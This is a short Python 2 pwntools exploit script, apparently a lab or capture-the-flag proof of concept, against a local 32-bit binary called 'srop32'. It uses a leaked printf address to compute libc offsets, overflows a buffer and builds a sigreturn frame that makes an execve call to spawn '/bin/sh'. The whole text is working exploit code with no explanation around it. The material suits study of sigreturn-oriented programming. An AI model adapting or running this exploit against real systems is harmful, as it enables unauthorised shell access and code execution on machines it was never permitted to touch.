from pwn import *
 
binary = ELF('./srop32')
p = process(binary.path)

p.recvuntil('Printf() address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)

#You need to change the value to match the environment you are testing.
libcBase = stackAddr - 0x49020
ksigreturn = libcBase + 0x1d5de1 
syscall = libcBase + 0x1d5de6 
binsh = libcBase + 0x15902b

print 'The base address of Libc    : ' + hex(libcBase)
print 'Address of syscall gadget   : ' + hex(syscall)
print 'Address of string "/bin/sh" : ' + hex(binsh)
print 'Address of sigreturn()      : ' + hex(ksigreturn)
 
exploit = ''
exploit += "\x90" * 66
exploit += p32(ksigreturn) 	#ret
exploit += p32(0x0)

#Runed a 32bit program in the 64bit operation system.
frame = SigreturnFrame(kernel='amd64')
#Runed a 32bit program in the 32bit operation system.
#frame = SigreturnFrame(kernel='i386')
frame.eax = 0xb
frame.ebx = binsh
frame.esp = syscall 
frame.eip = syscall
 
exploit += str(frame)

p.send(exploit)
p.interactive()
